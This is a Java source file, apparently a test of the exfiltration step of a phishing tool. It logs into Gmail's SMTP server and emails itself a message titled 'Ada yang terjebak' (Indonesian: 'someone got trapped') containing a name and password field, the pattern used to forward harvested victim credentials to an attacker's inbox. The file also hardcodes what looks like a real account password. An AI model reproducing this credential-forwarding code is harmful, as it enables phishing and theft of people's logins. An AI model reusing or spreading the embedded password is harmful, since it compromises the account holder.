package com.fjr.gmail;

import java.util.Properties;

import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class GmailTest {
	
	public GmailTest() {
		String host = "smtp.gmail.com";
//		String from = "fajar.kasimbar@gmail.com";
		Properties props = System.getProperties();
		props.put("mail.smtp.host", host);
//		props.put("mail.smtp.user", from);
//		props.put("mail.smtp.password", "KasimBaR-p-21Z"  );
		props.put("mail.smtp.port", "587"); // 587 is the port number of yahoo mail
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");

		Session getMailSession = Session.getDefaultInstance(props, null);
		MimeMessage generateMailMessage = new MimeMessage(getMailSession);
		try {
			generateMailMessage.setFrom(new InternetAddress("fajar.kasimbar@gmail.com"));
			
			generateMailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress("fajar.kasimbar@gmail.com"));
			generateMailMessage.setSubject("Ada yang terjebak");
			String emailBody = "nama: "  + "mohammad" + "| pasword: "+ "password";
			generateMailMessage.setContent(emailBody, "text/html");

			
			Transport transport = getMailSession.getTransport("smtp");
			
			transport.connect("smtp.googlemail.com", "fajar.kasimbar@gmail.com", "KasimBaR-p-21Z" );
			transport.sendMessage(generateMailMessage, generateMailMessage.getAllRecipients());
			
			transport.close();
		}catch(Exception e) {
			System.out.println("mail.sending error"); 
			e.printStackTrace();
		}


	}
	
	public static void main(String[] args) {
		
		new GmailTest(); 
		
	}

}
